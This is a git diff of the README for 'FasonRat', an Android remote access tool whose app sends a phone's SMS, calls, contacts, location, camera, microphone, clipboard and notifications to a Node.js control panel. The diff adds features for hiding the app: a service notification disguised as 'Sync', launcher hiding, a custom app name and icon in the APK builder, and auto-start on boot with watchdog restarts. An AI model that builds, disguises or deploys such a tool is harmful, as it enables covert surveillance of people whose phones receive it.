@@ -1,8 +1,8 @@
-# FasonRat
+# Fason
 
 <p align="center">
-  <img src="https://img.shields.io/badge/Version-2.3.1-purple?style=flat-square" alt="Version 2.3.1">
-  <img src="https://img.shields.io/badge/Android-15+-green?style=flat-square&logo=android" alt="Android 15+">
+  <img src="https://img.shields.io/badge/Version-2.3.2-purple?style=flat-square" alt="Version 2.3.2">
+  <img src="https://img.shields.io/badge/Android-7.0+-green?style=flat-square&logo=android" alt="Android 7.0+">
   <img src="https://img.shields.io/badge/Node.js-18+-339933?style=flat-square&logo=node.js" alt="Node.js 18+">
   <img src="https://img.shields.io/badge/Java-17-orange?style=flat-square&logo=openjdk" alt="Java 17">
   <img src="https://img.shields.io/badge/License-MIT-blue?style=flat-square" alt="MIT License">
@@ -30,13 +30,13 @@
 - 📍 **GPS Location** - Real-time location tracking with map view
 - 📂 **File Manager** - Browse and download files from device storage
 - 📷 **Camera** - Capture photos from front/back camera
-- 🎤 **Microphone** - Record audio remotely
+- 🎤 **Microphone** - Record audio remotely with custom duration
 - 📋 **Clipboard** - Monitor clipboard content in real-time
 - 🔔 **Notifications** - Capture and view all device notifications
 - 📶 **WiFi Scanner** - Scan nearby WiFi networks
 - 📦 **Installed Apps** - List all installed applications
 - 🔐 **Permissions** - View all granted/denied permissions
-- 🔧 **Fason Manager** - Hide/show app from device launcher
+- 🔧 **App Visibility** - Hide/show app from device launcher
 
 ### ⚡ Background Features
 - 🔄 **Auto Boot** - Starts automatically on device boot
@@ -44,11 +44,22 @@
 - 📡 **Auto Reconnect** - Reconnects automatically on connection loss
 - 🔋 **Wake Lock** - Ensures reliable background operation
 - 🌐 **Network Monitor** - Detects network changes and reconnects
+- 👻 **Hidden Notification** - Service notification shows as "Sync" with minimal visibility
 
-### 🛠️ Tools
-- **APK Builder** - Build custom APK with your server configuration
-- **Log Manager** - Track all system activity and events
-- **User Management** - Register, login, logout with session management
+### 🛠️ APK Builder
+- **Server URL** - Configure your server address
+- **App Name** - Customize app name shown on device
+- **App Icon** - Upload custom launcher icon (PNG/JPG/WebP)
+- **Home Page URL** - Set web page shown when app opens
+- **Auto Sign** - Built APK is automatically signed and ready to install
+
+### ⚙️ Server Settings (GUI)
+- **Limits** - Max clients, downloads, photos, recordings, history limits
+- **Security** - Session timeout, login attempts, lockout duration
+- **Socket.IO** - Ping interval, ping timeout
+- **Rate Limiting** - Window duration, max requests
+- **Logger** - Max DB logs, console output toggle
+- **Live Updates** - Changes saved to config file immediately
 
 ### 🔐 Security
 - **Session-based Auth** - Secure token-based authentication
@@ -91,7 +102,7 @@
 
 ```bash
 # Clone repository
-git clone https://github.com/fahimahamedwork/FasonRat.git
+git clone https://github.com/fahimahamed1/FasonRat.git
 cd FasonRat
 
 # Install and start server
@@ -107,8 +118,10 @@ Access control panel at `http://localhost:22533`
 
 **Option A: Web Builder (Recommended)**
 1. Open control panel → **Builder**
-2. Enter server URL → Click **Build APK**
-3. Download signed APK (`Fason.apk`)
+2. Enter server URL (e.g., `http://192.168.1.100:22533`)
+3. Optionally set custom app name and icon
+4. Click **Build APK**
+5. Download signed APK (`Fason.apk`)
 
 **Option B: Gradle**
 ```bash
@@ -125,67 +138,58 @@ cd fason
 <details>
 <summary>⚙️ Configuration</summary>
 
-### Server (`server/core/config/config.js`)
+### Via Web Interface (Recommended)
+Navigate to **Settings** page in the control panel to configure:
+- Server port and debug mode
+- Data limits (clients, downloads, photos, recordings, history)
+- Security settings (session timeout, login attempts, lockout)
+- Socket.IO settings (ping interval, timeout)
+- Rate limiting (window, max requests)
+- Logger settings (max logs, console output)
+
+Changes are saved to the config file immediately.
+
+### Via Config File
+
+**Server** (`server/core/config/config.js`)
 ```javascript
 module.exports = {
     port: 22533,
     debug: false,
 
-    // Feature limits
     limits: {
         maxClients: 500,
         maxDownloads: 100,
         maxPhotos: 100,
+        maxRecordings: 100,
         maxGpsHistory: 100,
         maxSmsHistory: 250,
         maxCallsHistory: 250,
         maxNotifications: 200,
         maxClipboardHistory: 200,
-        maxFileSize: 50 * 1024 * 1024  // 50MB
+        maxFileSize: 50 * 1024 * 1024
     },
 
-    // Socket.IO config
     socket: {
         pingInterval: 25000,
         pingTimeout: 60000,
         maxHttpBufferSize: 50e6
     },
 
-    // Rate limiting
     rateLimit: {
-        windowMs: 60000,    // 1 minute
+        windowMs: 60000,
         maxRequests: 100
     },
 
-    // Security
     security: {
-        sessionTimeout: 24 * 60 * 60 * 1000,  // 24 hours
+        sessionTimeout: 24 * 60 * 60 * 1000,
         loginAttempts: 5,
-        loginLockout: 15 * 60 * 1000          // 15 minutes
-    },
-
-    // Message keys (matching Android app)
-    msg: {
-        camera: '0xCA',
-        files: '0xFI',
-        calls: '0xCL',
-        sms: '0xSM',
-        mic: '0xMI',
-        location: '0xLO',
-        contacts: '0xCO',
-        wifi: '0xWI',
-        notification: '0xNO',
-        clipboard: '0xCB',
-        apps: '0xIN',
-        permissions: '0xPM',
-        checkPerm: '0xGP',
-        fasonManager: '0xFM',
-        deviceInfo: '0xIF'
+        loginLockout: 15 * 60 * 1000
     }
 };
 ```
 
-### Android (`fason/app/src/main/java/com/fason/app/core/config/Config.java`)
+**Android** (`fason/app/src/main/java/com/fason/app/core/config/Config.java`)
 ```java
 public class Config {
     public static final String SERVER_HOST = "http://YOUR_SERVER_IP:22533";
@@ -232,146 +236,13 @@ public class Config {
 - Filter by type, category, or search
 - Monitor login attempts, commands, errors
 
-</details>
-
-<details>
-<summary>🔧 How it Works</summary>
-
-### Architecture
-```
-┌─────────────────┐        Socket.IO         ┌─────────────────┐
-│   Android App   │◄────────────────────────►│  Control Panel  │
-│   (Java 17)     │     WebSocket/Polling    │   (Node.js)     │
-└─────────────────┘                          └─────────────────┘
-```
-
-### Communication Flow
-1. **Connection** - App starts `MainService`, connects to server with device info
-2. **Commands** - User sends command → Server emits event → App processes → Result returned
-3. **Sync** - Real-time WebSocket updates, auto-reconnection, JSON storage
-
-### Android Components
-
-| Component | Purpose |
-|-----------|---------|
-| `FasonApp` | Application class, initializes components |
-| `MainService` | Foreground service, keeps connection alive |
-| `SocketClient` | Socket.IO with auto-reconnect |
-| `SocketCommandRouter` | Routes socket events to feature managers |
-| `BootReceiver` | Auto-start on device boot |
-| `WatchdogReceiver` | Restart service if killed |
-| `KeepAliveWorker` | WorkManager for periodic health checks |
-| `Feature Managers` | Camera, Mic, GPS, SMS, etc. |
-
-### Server Components
-
-| Component | Purpose |
-|-----------|---------|
-| `Express Server` | Web interface and API |
-| `Socket.IO Server` | Real-time communication |
-| `Auth Module` | Login, register, session management |
-| `LowDB` | JSON data storage |
-| `APK Builder` | Modify and sign APKs |
-| `Task Manager` | Background maintenance tasks |
-
-</details>
-
----
-
-<details>
-<summary>📁 Project Structure</summary>
-
-```
-FasonRat/
-├── index.js                      # Main entry point
-├── package.json                  # Dependencies
-│
-├── fason/                        # Android Application
-│   ├── release.keystore          # Release signing keystore
-│   ├── keystore.properties       # Keystore config (optional)
-│   └── app/src/main/
-│       ├── java/com/fason/app/
-│       │   ├── core/             # App, Config, Socket, Permissions
-│       │   ├── features/         # Camera, Mic, SMS, GPS, etc.
-│       │   ├── service/          # MainService
-│       │   ├── receiver/         # Boot & Watchdog receivers
-│       │   ├── notifications/    # Notification listener
-│       │   ├── ui/               # MainActivity
-│       │   └── worker/           # KeepAliveWorker
-│       └── res/                  # Resources (XML icons)
-│
-├── server/                       # Control Panel Server
-│   ├── init.js                   # Server initialization
-│   ├── core/
-│   │   ├── auth/                 # Authentication module
-│   │   ├── config/               # Server configuration
-│   │   ├── routes/               # Express routes
-│   │   ├── socket/               # Socket.IO handlers
-│   │   ├── clients/              # Client management
-│   │   ├── builder/              # APK builder
-│   │   ├── database/             # LowDB setup
-│   │   ├── logs/                 # Logging system
-│   │   └── utils/                # Utilities & tasks
-│   ├── web/
-│   │   ├── views/                # EJS templates
-│   │   └── public/               # CSS, JS
-│   ├── data/                     # JSON database files
-│   └── app/factory/              # APK build tools
-│
-└── assets/                       # Documentation images
-```
-
-</details>
-
-<details>
-<summary>🔒 Permissions</summary>
-
-| Permission | Purpose |
-|------------|---------|
-| `INTERNET` | Server communication |
-| `ACCESS_NETWORK_STATE` | Network status |
-| `ACCESS_WIFI_STATE` | WiFi information |
-| `READ_SMS` / `SEND_SMS` | SMS access |
-| `READ_CALL_LOG` | Call history |
-| `READ_CONTACTS` | Contact access |
-| `READ_PHONE_STATE` | Device info |
-| `ACCESS_FINE_LOCATION` | GPS tracking |
-| `ACCESS_COARSE_LOCATION` | Network location |
-| `CAMERA` | Photo capture |
-| `RECORD_AUDIO` | Audio recording |
-| `READ_EXTERNAL_STORAGE` | File access (≤Android 10) |
-| `MANAGE_EXTERNAL_STORAGE` | Full storage (≥Android 11) |
-| `READ_MEDIA_*` | Media access (≥Android 13) |
-| `RECEIVE_BOOT_COMPLETED` | Auto-start on boot |
-| `FOREGROUND_SERVICE` | Background operation |
-| `POST_NOTIFICATIONS` | Notifications (≥Android 13) |
-
-</details>
-
-<details>
-<summary>📊 Tech Stack</summary>
-
-### Android
-| Technology | Version |
-|------------|---------|
-| Language | Java 17 |
-| Min SDK | 24 (Android 7.0) |
-| Target SDK | 35 (Android 15) |
-| Socket.IO | 2.1.0 |
-| UI | Material Design 3 |
-| Camera | CameraX 1.4.1 |
-| Location | Play Services 21.3.0 |
-| WorkManager | 2.10.0 |
-
-### Server
-| Technology | Version |
-|------------|---------|
-| Runtime | Node.js 18+ |
-| Framework | Express.js 4.17 |
-| Real-time | Socket.IO 4.8 |
-| Database | LowDB 1.0 |
-| Templates | EJS 3.1 |
-| Auth | Cookie-based sessions |
+### Server Settings
+- Configure limits (clients, downloads, photos, recordings, history)
+- Adjust security settings (session timeout, login attempts, lockout)
+- Modify Socket.IO settings (ping interval, timeout)
+- Set rate limiting parameters
+- Toggle logger options
+- All changes saved to config file automatically
 
 </details>
 
